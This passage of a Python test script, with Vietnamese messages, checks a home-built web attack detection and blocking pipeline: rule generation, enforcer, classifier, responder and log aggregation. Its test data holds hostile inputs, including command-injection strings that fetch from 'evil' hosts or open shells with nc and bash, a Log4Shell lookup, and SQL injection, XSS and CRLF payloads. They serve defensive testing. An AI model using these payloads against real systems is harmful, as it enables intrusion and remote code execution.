    r0 = spec_rules[0]
    check("luật G2r qua kiểm tra tĩnh", G.static_check(r0))
    check("tệp luật có luật G2r được enforcer chấp nhận", published and F.valid_rules(published[-1]) == 0,
          published[-1] if published else "")
    check("luật G2r bắt biến thể chưa thấy", G.rule_hits(r0, {"arg": [], "marg": [("id", "77' union select a,b-- -")]}))
    check("luật G2r không khớp giá trị lành tính", not G.rule_hits(r0, {"arg": [], "marg": [("id", "laptop")]}))

print("== rulegen: lớp RCE — regex nối-lệnh viết sẵn là ứng viên đặc biệt (phương án A)")
G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
rce_m = ["127.0.0.1;cat /etc/passwd", "127.0.0.1;cat /etc/shadow", "127.0.0.1;wget http://evil/x",
         "127.0.0.1;curl http://evil/s", "127.0.0.1;uname -a", "127.0.0.1;nc -e /bin/sh", "127.0.0.1;bash -i"]
fes.events = [mweb(f"10.10.10.{150 + i}", "rce", [("ip", v), ("Submit", "Submit")]) for i, v in enumerate(rce_m)] \
             + [mweb("10.10.10.20", "benign", [("ip", "8.8.8.8"), ("q", "tom & jerry")])] * 150
published.clear()
G.cycle()
rr = [r for r in G.state["rules"].values() if G.is_spec(r) and r["class"] == "rce"]
check("RCE đa dạng -> luật regex viết sẵn (rx_fixed), đích ARGS:ip",
      len(rr) == 1 and rr[0]["spec"]["op"] == "rx_fixed" and rr[0]["target"] == "ARGS:ip", str(rr))
if rr:
    check("luật regex viết sẵn bắt biến thể ';id' chưa từng thấy",
          G.rule_hits(rr[0], {"arg": [], "marg": [("ip", "127.0.0.1;id")]}))
    check("luật regex viết sẵn không khớp giá trị lành tính",
          not G.rule_hits(rr[0], {"arg": [], "marg": [("ip", "8.8.8.8")]}))
    check("tệp luật có luật regex viết sẵn được enforcer chấp nhận", published and F.valid_rules(published[-1]) == 0,
          published[-1] if published else "")
check("Benign.hit_idx quét thật với regex viết sẵn (không lọc nhanh bằng chuỗi token)",
      G.M.Benign(["127.0.0.1;id"]).hit_idx(G.RCE_FIXED_SPEC) == {0})
G.g2r = None
G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
G.cycle()
check("không nạp được G2r -> không sinh luật mới (an toàn khi hỏng)", not G.state["rules"])

# =====================================================================  enforcer
import enforcer as F
print("== enforcer: chỉ ghi nội dung đúng định dạng (L10), không áp bản cũ (C11)")
good = G.render({**ok_rule, "state": "active"}) + "\n" + line + "\n"
check("tệp luật do rulegen sinh được chấp nhận", F.valid_rules("# generated by rulegen — do not edit\n" + good) == 0)
check("chỉ thị Apache lạ bị từ chối", F.valid_rules(good + 'LoadModule evil_module /tmp/x.so\n') == 3)
check("SecRule sai mẫu bị từ chối", F.valid_rules('SecRule REQUEST_URI "@contains /" "id:1,phase:1,deny"\n') == 1)
written = {}
F.atomic_write = lambda path, text: written.__setitem__(path, text)
p = FakeProd()
F.write_blocklist({"ips": ["10.10.10.66", "khong-phai-ip; }", "10.10.10.66", "2001:db8::1"], "ts": 100.0}, p)
check("mục không phải IP bị bỏ, IP trùng gộp lại",
      written[F.MAP_PATH].splitlines()[1:] == ["10.10.10.66 1;", "2001:db8::1 1;"], written.get(F.MAP_PATH))
F.write_blocklist({"ips": [], "ts": 50.0}, p)
check("snapshot có ts cũ hơn bị bỏ qua", "10.10.10.66" in written[F.MAP_PATH])
check("bản tin gửi cùng một key (cùng partition)", all(k == b"blocklist" for _, k, _ in p.msgs))

# =====================================================================  xác thực + nhịp tim + logsink
print("== common: đăng nhập Kafka và nhịp tim")
os.environ.pop("KAFKA_USER", None)
check("không có KAFKA_USER -> không thêm cấu hình SASL", common.kafka_auth() == {})
os.environ.update({"KAFKA_USER": "responder", "KAFKA_PASSWORD": "bi-mat"})
ka = common.kafka_auth()
check("có KAFKA_USER -> SASL/PLAIN đúng tài khoản", ka.get("security.protocol") == "SASL_PLAINTEXT"
      and ka.get("sasl.mechanism") == "PLAIN" and ka.get("sasl.username") == "responder" and ka.get("sasl.password") == "bi-mat")
os.environ.pop("KAFKA_USER", None)
hclock = [5_000_000.0]
common.time.time = lambda: hclock[0]
hbuf = FakeBuf(); hbuf.failures = 2; hbuf.buf = [1, 2, 3]
hb = common.Heartbeat("demo", hbuf, every=30)
check("chưa tới hạn thì chưa ghi nhịp tim", hb.tick() is None and not hbuf.docs)
hclock[0] += 6; hb.inc(40)
d = hb.tick(extra_field=7)
check("nhịp đầu sau ~5 giây, có đủ số liệu", d is not None and hbuf.docs[-1] is d and d["service"] == "demo"
      and d["processed"] == 40 and d["es_failures"] == 2 and d["es_buffered"] == 3 and d["extra_field"] == 7, str(d))
hclock[0] += 10
check("trong 30 giây kế tiếp không ghi thêm", hb.tick() is None and len(hbuf.docs) == 1)
hclock[0] += 21; hb.inc(60)
d = hb.tick()
check("nhịp kế tiếp tính đúng tốc độ xử lý", d is not None and d["processed"] == 100 and abs(d["rate"] - 60 / 31) < 0.01, str(d))
hb2 = common.Heartbeat("enforcer", None, every=30); hclock[0] += 6
d = hb2.tick()
check("không có bộ đệm ES (enforcer) -> trả bản ghi để gửi qua Kafka", d is not None and "es_failures" not in d)

print("== logsink: gom nhật ký Cổng 1 và error.log (không ghi từng dòng)")
import logsink as S
S.gate.clear(); S.errs.clear()
for i in range(300):
    S.add_gate({"ts": 1000.0 + i * 0.01, "src_ip": "10.10.10.66", "method": "GET", "uri": f"/scan/{i % 3}.php", "status": 403,
                "blocked": 1, "ua": "curl/8"}, now=2000.0)
S.add_gate({"ts": 1001.0, "src_ip": "10.10.10.77", "method": "POST", "uri": "/login.php", "status": 429, "ua": "x"}, now=2000.0)
S.add_gate({"status": 403}, now=2000.0)
sbuf = FakeBuf(); S.flush(sbuf, now=2000.0)
g66 = [d for d in sbuf.docs if d.get("src_ip") == "10.10.10.66"]
check("300 request của một IP bị chặn -> MỘT bản ghi có count=300", len(g66) == 1 and g66[0]["count"] == 300
      and g66[0]["reason"] == "blocklist" and g66[0]["uniq_targets"] == 3 and g66[0]["top_target"].startswith("GET /scan/"), str(g66))
check("429 được ghi là 'limit'; dòng thiếu IP bị bỏ", any(d.get("reason") == "limit" and d["src_ip"] == "10.10.10.77" for d in sbuf.docs)
      and len(sbuf.docs) == 2)
check("sau khi ghi, bộ gom được làm rỗng", not S.gate and not S.errs)
ms = ('[Wed Nov 11 15:23:01.313763 2026] [security2:error] [pid 66:tid 66] [client 172.31.0.5:0] [client 10.10.10.66] '
      'ModSecurity: Warning. Pattern match "x" at ARGS:id. [file "/a.conf"] [line "7"] [id "942100"] [msg "SQL Injection Attack"] '
      '[unique_id "%s"]')
for i in range(40): S.add_err(ms % f"abc{i}", now=3000.0)
S.add_err("[Wed Nov 11 15:23:02.000001 2026] [php:warn] [pid 70:tid 70] [client 10.10.10.20:51234] PHP Warning:  Undefined variable $x in /var/www/html/a.php on line 12", now=3000.0)
S.add_err("dòng không theo định dạng nào", now=3000.0)
S.add_err("", now=3000.0)
sbuf = FakeBuf(); S.flush(sbuf, now=3000.0)
m = [d for d in sbuf.docs if d.get("rule_id") == "942100"]
check("40 dòng ModSecurity cùng luật, cùng IP -> một bản ghi count=40, IP thật, có mã luật", len(m) == 1 and m[0]["count"] == 40
      and m[0]["src_ip"] == "10.10.10.66" and m[0]["module"] == "security2" and m[0]["message"] == "SQL Injection Attack", str(m))
ph = [d for d in sbuf.docs if d.get("module") == "php"]
check("dòng PHP: tách module/mức/IP (bỏ cổng)", len(ph) == 1 and ph[0]["level"] == "warn" and ph[0]["src_ip"] == "10.10.10.20"
      and "Undefined variable" in ph[0]["message"], str(ph))
check("dòng sai định dạng vẫn được giữ (level=unknown), dòng rỗng bị bỏ",
      len(sbuf.docs) == 3 and any(d["level"] == "unknown" for d in sbuf.docs))
old_max = S.MAX_KEYS; S.MAX_KEYS = 5
for i in range(50): S.add_gate({"ts": 1.0, "src_ip": f"10.9.0.{i}", "status": 403}, now=1.0)
check("trần số khoá gom chặn phình bộ nhớ và đếm số bị bỏ", len(S.gate) == 5 and S.dropped["gate"] == 45)
S.MAX_KEYS = old_max; S.gate.clear()

# =====================================================================  sửa sau rà soát 12/11/2026
print("== common.EsBuffer: ghi ES ở luồng nền, ES hỏng không chặn vòng lặp (N2)")
calls = {"n": 0, "fail": True}
def fake_bulk(client, actions, **kw):
    calls["n"] += 1
    if calls["fail"]: raise ConnectionError("ES down")
    return len(actions), []
es_mod.helpers.bulk = fake_bulk
eb = common.EsBuffer(object(), flush_n=3, max_buf=5, start=False)
import time as _t
t_add = _t.perf_counter()
for i in range(4): eb.add("web-events-x", {"i": i})
check("add() không gọi Elasticsearch (chỉ xếp hàng)", calls["n"] == 0 and len(eb.buf) == 4 and _t.perf_counter() - t_add < 0.05)
check("ES hỏng: write_once trả False, giữ bản ghi để thử lại", eb.write_once() is False and len(eb.buf) == 4 and eb.failures == 1)
check("thời gian chờ thử lại tăng dần", eb._backoff == 1.0 and (eb.write_once() is False) and eb._backoff == 2.0)
for i in range(4, 8): eb.add("web-events-x", {"i": i})
check("vượt max_buf: bỏ bản CŨ nhất, đếm số bị bỏ", len(eb.buf) == 5 and eb.dropped == 3 and eb.buf[0]["_source"]["i"] == 3,
      str([a["_source"]["i"] for a in eb.buf]))
calls["fail"] = False
check("ES trở lại: ghi hết, bộ đệm rỗng, hết thời gian chờ", eb.write_once() and not eb.buf and eb._backoff == 0.0)

print("== classifier: cảnh báo phát TRƯỚC khi ghi ES (N2)")
class OrderBuf(FakeBuf):
    def add(self, idx, doc, _id=None):
        self.alert_before = bool(C.PROD.msgs); super().add(idx, doc, _id)
C.ES_BUF, C.PROD = OrderBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "GET", "uri": "/x", "query": "?id=1%27+or+%271%27%3D%271",
              "status": 200, "ua": "curl", "req_id": "O1"})
check("thông điệp alerts đã gửi khi bản ghi ES được đưa vào bộ đệm", C.PROD.msgs and C.ES_BUF.alert_before)

print("== classifier: tầng 2 chỉ ghi nhận (N1)")
r = cls("/search", "q=it%27s+ok")
check("'it's ok' không bị gắn nhãn tấn công", r["label"] == "benign", str(r))
r = cls("/api/cart", "", '{"items": [{"id": 12, "qty": 2}], "coupon": "SALE10"}')
check("thân JSON hợp lệ không bị gắn nhãn", r["label"] == "benign", str(r))
r = cls("/x", "q=%27%29%29+or+sleep%28%29%23")
check("tấn công tầng 1 bắt được vẫn bị gắn nhãn", r["label"] == "sqli" and r["tier"] == 1, str(r))

print("== classifier: không né được bằng cách đệm (N3)")
att = "1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-"
for name, q, b in [("sau 100 tham số đệm", "&".join(f"p{i}=1" for i in range(100)) + "&id=" + att, ""),
                   ("sau 2048 ký tự đệm", "id=" + "a" * 2048 + att, ""),
                   ("thân form sau 100 tham số", "", "&".join(f"p{i}=1" for i in range(100)) + "&id=" + att),
                   ("thân JSON sau 4096 ký tự", "", '{"pad": "' + "a" * 4096 + '", "id": "1\' UNION SELECT user,password FROM users-- -"}')]:
    r = cls("/item", q, b)
    check(f"SQLi {name} vẫn bị bắt", r["label"] == "sqli", str(r))
old = C.SCAN_MAX_BYTES; C.SCAN_MAX_BYTES = 1000
r = cls("/item", "id=" + "a" * 2000)
check("vượt trần quét -> nhãn 'uninspected' (không coi là lành tính), độ tin cậy dưới θ",
      r["label"] == "uninspected" and r["conf"] < 0.9 and r["field"] == "bytes", str(r))
C.SCAN_MAX_BYTES = old
old = C.MAX_PARAMS; C.MAX_PARAMS = 10
check("vượt trần số tham số -> 'uninspected'", cls("/x", "&".join(f"p{i}=1" for i in range(20)))["field"] == "params")
C.MAX_PARAMS = old

print("== classifier: soi header và cookie (C2)")
r = C.classify("/", [], [], "${jndi:ldap://evil.example/a}", {"uri": "/", "query": "", "body": ""})
check("Log4Shell trong User-Agent -> rce", r["label"] == "rce" and r["field"] == "REQUEST_HEADERS:User-Agent", str(r))
r = C.classify("/", [], [], "Mozilla/5.0", {"uri": "/", "query": "", "body": ""},
               {"Referer": "http://a/?q=%3Cscript%3Ealert(1)%3C/script%3E"})
check("XSS trong Referer -> ghi nhận với độ tin cậy dưới θ (nạn nhân XSS phản xạ không bị chặn)",
      r["label"] == "xss" and r["conf"] < 0.9, str(r))
r = C.classify("/", [], [], "Mozilla/5.0", {"uri": "/", "query": "", "body": ""},
               {"cookies": C.cookie_params("security=low; id=1%27%20union%20select%201,2--")})
check("SQLi trong cookie -> sqli", r["label"] == "sqli" and r["field"] == "REQUEST_COOKIES:id", str(r))
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
       "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Mobile Safari/537.36",
       "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "curl/8.10.1", "python-requests/2.32.3"]
check("User-Agent thông thường không bị gắn nhãn",
      all(C.classify("/", [], [], u, {"uri": "/", "query": "", "body": ""})["label"] == "benign" for u in UAS))

print("== classifier: luật CRLF không soi cấu trúc thân multipart")
MP = ('--xyzBOUND\r\nContent-Disposition: form-data; name="title"\r\n\r\ngiày thể thao size 42\r\n'
      '--xyzBOUND\r\nContent-Disposition: form-data; name="uploaded"; filename="anh.jpg"\r\nContent-Type: image/jpeg\r\n\r\n'
      '\xff\xd8\xff\xe0 JFIF\r\nContent-Type: lẫn trong dữ liệu tệp\r\n\r\n--xyzBOUND--\r\n')
r = cls("/upload.php", "", MP)
check("tải tệp hợp lệ (multipart) không bị gắn nhãn crlf", r["label"] != "crlf", str(r))
MPX = ('--xyzBOUND\r\nContent-Disposition: form-data; name="next"\r\n\r\n/home\r\nSet-Cookie: admin=1\r\n'
       '--xyzBOUND--\r\n')
r = cls("/upload.php", "", MPX)
check("CRLF trong NỘI DUNG một trường văn bản multipart vẫn bị bắt", r["label"] == "crlf", str(r))
check("multipart_text_values bỏ phần tệp và phần đầu",
      C.multipart_text_values(MP.lower()) == ["giày thể thao size 42"], str(C.multipart_text_values(MP.lower())))

from urllib.parse import quote_plus
print("== classifier: javascript:void(0) và recon trên trang có thật")
for v in ["javascript:void(0)", "javascript:void(0);", "javascript:;", "javascript: void( 0 )"]:
    r = cls("/x", "ep.link_url=" + quote_plus(v))
    check(f"{v!r} (liên kết không làm gì) không bị gắn xss", r["label"] != "xss", str(r))
r = cls("/x", "", '{"destination":"javascript:void(0);","id":""}')
check("javascript:void(0) trong thân JSON không bị gắn xss", r["label"] != "xss", str(r))
for v in ["javascript:alert(1)", "javascript:void(0);alert(document.cookie)", "JaVaScRiPt:fetch('//evil')"]:
    check(f"{v!r} vẫn bị bắt xss", cls("/x", "u=" + quote_plus(v))["label"] == "xss")
def cls_status(path, status):
    ev = {"uri": path, "query": "", "body": "", "status": status}
    return C.classify(C.decode_p(path).lower(), [], [], "Mozilla/5.0", ev)
r = cls_status("/wp-admin/admin-ajax.php", 200)
check("recon trên trang CÓ THẬT (200) chỉ ghi nhận (độ tin cậy dưới θ)", r["label"] == "recon" and r["conf"] < 0.9, str(r))
r = cls_status("/phpmyadmin/", 404)
check("recon trên tài nguyên không tồn tại (404) vẫn đủ độ tin cậy để chặn", r["label"] == "recon" and r["conf"] >= 0.9, str(r))
r = C.classify("/wp-admin/", [], [], "sqlmap/1.8", {"uri": "/wp-admin/", "query": "", "body": "", "status": 200})
check("trang có thật nhưng User-Agent công cụ quét -> scanner (0,9)", r["label"] == "scanner" and r["conf"] >= 0.9, str(r))

print("== classifier: nối lệnh bằng xuống dòng chỉ tính dạng '127.0.0.1\\nid'")
check("127.0.0.1%0aid -> rce", cls("/vulnerabilities/exec/", "", "ip=127.0.0.1%0aid&Submit=Submit")["label"] == "rce")
check("127.0.0.1%0a%0dcat /etc/passwd -> rce", cls("/x", "ip=127.0.0.1%0a%0dcat+/etc/passwd")["label"] in ("rce", "lfi"))
for txt in ["Thú cưng:\ncat and dog", "Ghi chú:\nid card bị mất", "dòng 1\nls là viết tắt của list"]:
    r = cls("/form", "", "note=" + quote_plus(txt))
    check(f"ô văn bản nhiều dòng hợp lệ không bị gắn rce: {txt!r}", r["label"] != "rce", str(r))
r = cls("/api", "", '{\n  "title": "x",\n  "body": "Content-Type: text"\n}')
check("thân JSON định dạng đẹp không bị luật CRLF", r["label"] != "crlf", str(r))

print("== classifier: che dữ liệu nhạy cảm trước khi lưu (C1)")
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.20", "method": "POST", "uri": "/login.php", "query": "?token=abc123",
              "status": 302, "ua": "Mozilla/5.0", "req_id": "S1", "ct": "application/x-www-form-urlencoded", "cl": "60",
              "cookie": "PHPSESSID=s3cr3tsess; security=low"})
C.handle_audit({"transaction": {"transaction_id": "S1"}, "request": {"body": ["username=admin&password=Hunter2%21&Login=Login"]}})
d = C.ES_BUF.docs[-1]
blob = json.dumps(d)
check("mật khẩu, token, mã phiên không còn trong bản ghi ES", "Hunter2" not in blob and "hunter2" not in blob
      and "abc123" not in blob and "s3cr3tsess" not in blob, blob[:300])
check("tên tham số và giá trị không nhạy cảm vẫn giữ", "username" in d["arg_n"] and "admin" in d["arg_v"]
      and d["cookie_n"] == ["phpsessid", "security"], str((d["arg_n"], d["arg_v"], d.get("cookie_n"))))
check("che trong JSON / XML / multipart", "x1y2" not in C.redact_text('{"user": "a", "password": "x1y2"}')
      and "x1y2" not in C.redact_text("<r><pass>x1y2</pass></r>")
      and "x1y2" not in C.redact_text('--b\r\nContent-Disposition: form-data; name="password"\r\n\r\nx1y2\r\n--b--'))
nb, npd = FakeBuf(), FakeProd()
C.handle_net({"event_type": "http", "timestamp": "2026-11-09T09:00:00.000000+0000", "src_ip": "10.10.10.66",
              "dest_ip": "10.10.10.10", "http": {"url": "/index.php?api_token=S3cret-123&q=laptop", "http_method": "GET",
              "status": 200, "http_user_agent": "Mozilla/5.0"}}, nb, npd)
check("sự kiện HTTP của Suricata: token trong query bị che (C1, kịch bản 29)",
      nb.docs and "s3cret-123" not in json.dumps(nb.docs[-1]).lower() and "q=laptop" in nb.docs[-1]["target"],
      str(nb.docs[-1] if nb.docs else None))

print("== classifier: thân bị ModSecurity cắt (C7) và request không có thân (T13)")
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/collect", "query": "", "status": 200,
              "ua": "x", "req_id": "T1", "ct": "application/octet-stream", "cl": "1346"})
C.handle_audit({"transaction": {"transaction_id": "T1"},
                "request": {"body": ["\x1f\x8b\x08"], "headers": {"Content-Length": "1346", "Content-Type": "application/octet-stream"}}})
d = C.ES_BUF.docs[-1]
check("thân chỉ còn 3/1346 byte -> 'uninspected', body_truncated", d["label"] == "uninspected" and d.get("body_truncated"), str(d)[:200])
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/logout", "query": "", "status": 302,
              "ua": "x", "req_id": "T2", "ct": "-", "cl": "-", "te": "-"})
check("POST không có Content-Length -> phân loại ngay, không chờ 15 giây", C.ES_BUF.docs and "T2" not in C.PENDING)
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/x", "query": "", "status": 200,
              "ua": "x", "req_id": "T3", "ct": "-", "cl": "-", "te": "chunked"})
check("POST chunked (không có Content-Length) vẫn chờ thân", "T3" in C.PENDING)
C.PENDING.clear()
old = C.PENDING_MAX; C.PENDING_MAX = 3
for i in range(6):
    C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/x", "query": "", "status": 200,
                  "ua": "x", "req_id": f"P{i}", "ct": "a/b", "cl": "5"})
check("hàng chờ có trần: mục cũ nhất được phân loại không thân, không mất", len(C.PENDING) == 3 and C.DROPPED["pending"] >= 3)
C.PENDING_MAX = old; C.PENDING.clear()

print("== responder: IP dùng chung -> chặn theo (IP, User-Agent) (D1)")
R.time.time = lambda: clock[0]          # phần nhịp tim ở trên đã thay đồng hồ chung của module time
R.prod = FakeProd()
R.decide({"kind": "ip_profile", "src_ip": "10.10.10.150", "uas": 6, "ts": clock[0], "confidence": 0})
check("tier3 báo IP dùng chung -> ghi nhận", R.is_shared("10.10.10.150", clock[0]))
for i in range(5):
    d = alert("10.10.10.150", target=f"/a?id={i}", ua="sqlmap/1.8"); clock[0] += 1
check("đủ ngưỡng -> chặn khoá (IP, User-Agent), không chặn cả IP", d["decision"] == "block" and d.get("scope") == "fingerprint"
      and d.get("fp_ua") == "sqlmap/1.8" and "10.10.10.150" not in R.state["blocks"], str(d))
snap = R.prod.msgs[-1][2]
check("snapshot gửi enforcer có fps", ["10.10.10.150", "sqlmap/1.8"] in snap["fps"] and "10.10.10.150" not in snap["ips"], str(snap))
d = alert("10.10.10.150", target="/b?id=9", ua="Mozilla/5.0 (người dùng khác)")
check("người dùng khác sau cùng NAT chỉ bị đếm, không bị chặn", d["decision"] == "count", str(d))
for k in range(2):
    for i in range(5):
        d = alert("10.10.10.150", target=f"/c{k}?id={i}", ua=f"tool-{k}"); clock[0] += 1
check(f"đổi User-Agent liên tục: đủ {R.SHARED_ESCALATE} dấu vân tay bị chặn -> chặn cả IP",
      R.state["blocks"].get("10.10.10.150", {}).get("active") and d["decision"] == "block", str(d))
R.control({"cmd": "unblock", "ip": "10.10.10.150", "id": "u1", "ts": clock[0]})
check("gỡ chặn một IP gỡ cả các dấu vân tay của IP đó", not any(k.startswith("10.10.10.150") for k in R.state["blocks"]))
d = alert("10.10.10.151", target="/a?id=1", ua='bad"ua')
check("IP không phải dùng chung: vẫn chặn/đếm theo IP như cũ", d.get("scope") is None)

print("== responder: báo 'dùng chung' đến SAU lệnh chặn cả IP (tranh chấp thời gian, kịch bản 13 lượt 15/11)")
R.prod = FakeProd()
for i in range(5):
    d = alert("10.10.10.160", target=f"/a?id={i}", ua="sqlmap/1.8"); clock[0] += 1
check("chưa biết là IP dùng chung -> chặn cả IP", R.state["blocks"].get("10.10.10.160", {}).get("active"), str(d))
clock[0] += 1
R.decide({"kind": "ip_profile", "src_ip": "10.10.10.160", "uas": 4, "ts": clock[0], "confidence": 0})
snap = R.prod.msgs[-1][2]
check("báo dùng chung trong SHARED_GRACE -> hạ xuống (IP, User-Agent gây chặn)",
      "10.10.10.160" not in R.state["blocks"] and R.state["blocks"].get("10.10.10.160|sqlmap/1.8", {}).get("active")
      and "10.10.10.160" not in snap["ips"] and ["10.10.10.160", "sqlmap/1.8"] in snap["fps"], str(snap))
d = alert("10.10.10.160", target="/b?id=1", ua="Mozilla/5.0 (người dùng khác)")
check("sau khi hạ: người dùng khác cùng IP chỉ bị đếm", d["decision"] == "count", str(d))
for i in range(5):
    d = alert("10.10.10.161", target=f"/a?id={i}", ua="sqlmap/1.8"); clock[0] += 1
clock[0] += R.SHARED_GRACE + 5
R.decide({"kind": "ip_profile", "src_ip": "10.10.10.161", "uas": 4, "ts": clock[0], "confidence": 0})
check("báo dùng chung QUÁ SHARED_GRACE -> giữ chặn cả IP", R.state["blocks"].get("10.10.10.161", {}).get("active"))
R.control({"cmd": "unblock", "ip": "10.10.10.160", "id": "u2", "ts": clock[0]})
R.control({"cmd": "unblock", "ip": "10.10.10.161", "id": "u3", "ts": clock[0]})

print("== enforcer: ghi blockfp.map cho dấu vân tay (D1)")
written.clear()
F.last_ts["blocklist"] = 0.0
F.write_blocklist({"ips": ["10.10.10.66"], "fps": [["10.10.10.5", "curl/8.1"], ["10.10.10.6", 'x" 1; }'],
                                                     ["khong-phai-ip", "a"]], "ts": 999.0}, FakeProd())
fp_lines = written[F.FP_PATH].splitlines()[1:]
check("chỉ dấu vân tay hợp lệ được ghi, đúng cú pháp map của nginx", fp_lines == ['"10.10.10.5|curl/8.1" 1;'], str(fp_lines))

print("== tier3: mẫu 'denied' không chặn người dùng gửi lại một form bị CRS chặn nhầm (C4)")
m = run_tier3([("/contact.php", 403, "POST", "")] * 12 + [("/", 200, "GET", "")] * 4)
check("12 lần 403 trên MỘT đường dẫn -> không báo", not [x for x in m if x[2].get("immediate")], str(m[:1]))
m = run_tier3([(f"/p{i % 4}.php", 403, "GET", "?id=1'") for i in range(16)])
check("403 dồn dập trên nhiều đường dẫn -> 'denied'", m and m[0][2]["shape"] == "denied", str(m[:1]))
m = run_tier3([("/vulnerabilities/sqli/", 403, "GET", f"?id={i}'") for i in range(40)])
check("dò một tham số rất dày (40 lần 403) -> vẫn 'denied'", m and m[0][2]["shape"] == "denied", str(m[:1]))
saved = T.M; T.M = None
m = run_tier3([(f"/secret_{i}.php", 404, "GET", "") for i in range(40)])
check("không có model: vẫn phát hiện bằng cổng định hình (không đứng yên)", m and m[0][2]["shape"] == "recon", str(m[:1]))
T.M = saved
T.st.clear(); buf, prod = FakeBuf(), FakeProd()
T.time.time = lambda: 3_000_010.0
for i in range(20):
    T.add({"src_ip": "10.10.10.160", "ts_ms": (3_000_000 + i * 0.3) * 1000, "uri": "/", "status": 200, "method": "GET",
           "query": "", "ua": f"Browser/{i % 5}"}, prod, buf)
check("5 User-Agent khác nhau trong cửa sổ -> báo responder IP dùng chung", any(x[2].get("kind") == "ip_profile" for x in prod.msgs))

print("== logsink: request dị dạng bị nginx từ chối được ghi (C5)")
S.gate.clear()
S.add_gate({"ts": 1.0, "src_ip": "10.10.10.66", "status": 414, "blocked": 0, "request": "GET /aaaa"}, now=1.0)
S.add_gate({"ts": 1.0, "src_ip": "10.10.10.67", "status": 403, "blocked": 1, "fp_blocked": 1}, now=1.0)
sbuf = FakeBuf(); S.flush(sbuf, now=2.0)
check("414 -> reason 'rejected' kèm dòng request", any(d["reason"] == "rejected" and d["status"] == 414 and d.get("request") for d in sbuf.docs))
check("403 do dấu vân tay -> reason 'fingerprint'", any(d["reason"] == "fingerprint" for d in sbuf.docs))

print("== Cổng 2: luật tầng 1 đồng bộ khớp mã nguồn classifier")
import subprocess
_g = subprocess.run([sys.executable, "-X", "utf8", "-B", os.path.join(ROOT, "tools", "gen_tier1_modsec.py"), "--check"],
                    capture_output=True, text=True, encoding="utf-8")
check("web/apache/nsm-tier1.conf được sinh lại sau khi sửa regex tầng 1", _g.returncode == 0, _g.stderr.strip())
_t1 = open(os.path.join(ROOT, "web", "apache", "nsm-tier1.conf"), encoding="utf-8").read()
_ids = [int(x) for x in re.findall(r"\bid:(\d+)", _t1)]
check("id luật tầng 1 đồng bộ nằm trong dải 1000200–1000399, không trùng",
      _ids and all(1000200 <= i < 1000400 for i in _ids) and len(_ids) == len(set(_ids)), str(_ids[:5]))
check("mọi lớp tầng 1 chặn chắc chắn đều có luật đồng bộ",
      {c for c, _p, sc in C._RULES if sc != "redirect"} | {"scanner"}
      == set(re.findall(r"tag:'nsm/tier1/(\w+)'", _t1)))
check("Referer / open redirect (chỉ ghi nhận) không bị chặn đồng bộ",
      "Referer" not in _t1 and "nsm/tier1/redirect" not in _t1)
_za = open(os.path.join(ROOT, "web", "apache", "zz-autogen.conf"), encoding="utf-8").read()
check("luật đồng bộ nạp SAU luật tự sinh",
      0 <= _za.find("autogen/active.conf") < _za.find("nsm-sync/tier1.conf"))

print("== công cụ kịch bản: tổng hợp kết quả GoTestWAF / waf-bypass và ghép ma trận")
sys.path.insert(0, os.path.join(ROOT, "tools"))
import scenario as SC
check("công cụ kịch bản còn đủ các lệnh con (15/11: một bản vá từng xoá nhầm cmd_observe)",
      all(callable(getattr(SC, f, None)) for f in ("cmd_plan", "cmd_actor", "cmd_observe", "cmd_judge", "cmd_report",
                                                    "cmd_toolparse", "grafana_alerts", "per_ip_stats", "matrix_table")))
_g = SC.gotestwaf_summary({"score": 60.0, "summary": {
    "true_positive_tests": {"score": 40.0, "summary": {"total_sent": 10, "resolved_tests": 10, "blocked_tests": 4, "bypassed_tests": 6,
                                                       "unresolved_tests": 0, "failed_tests": 0},
                            "test_sets": {"owasp": {"sqli": {"sent": 10, "blocked": 4, "bypassed": 6, "unresolved": 0},
                                                    "empty": {"sent": 0, "blocked": 0, "bypassed": 0, "unresolved": 0}}}},
    "true_negative_tests": {"score": 90.0, "summary": {"total_sent": 10, "resolved_tests": 10, "blocked_tests": 1, "bypassed_tests": 9,
                                                       "unresolved_tests": 0, "failed_tests": 0}, "test_sets": {}}}})
check("GoTestWAF: lấy đúng số bị chặn / đi qua của hai bộ thử", _g["tp"]["blocked"] == 4 and _g["tn"]["bypassed"] == 9
      and list(_g["sets"]) == ["tp:owasp/sqli"], str(_g))
_w = SC.wafbypass_summary({"PASSED": {"SQLi/1.json": {"ARGS": 1, "BODY": 1}, "XSS/2.json": {"ARGS": 1}},
                           "BYPASSED": {"SQLi/1.json": {"COOKIE": 1}}, "FALSED": {"FP/1.json": {"ARGS": 1}}, "FAILED": {},
                           "TARGET": "x"})
check("waf-bypass: đếm theo tệp, theo cặp (payload, vùng) và theo nhóm",
      _w["files"] == {"PASSED": 2, "BYPASSED": 1, "FALSED": 1, "FAILED": 0} and _w["zones"]["PASSED"] == 3
      and _w["by_group"]["SQLi"] == {"PASSED": 1, "BYPASSED": 1} and _w["block_share_zones"] == 0.75, str(_w))
check("bảng Markdown của công cụ có dòng tổng", any("Tấn công (bị chặn là đúng) | 10 | 4" in l for l in SC.tool_md("x", _g))
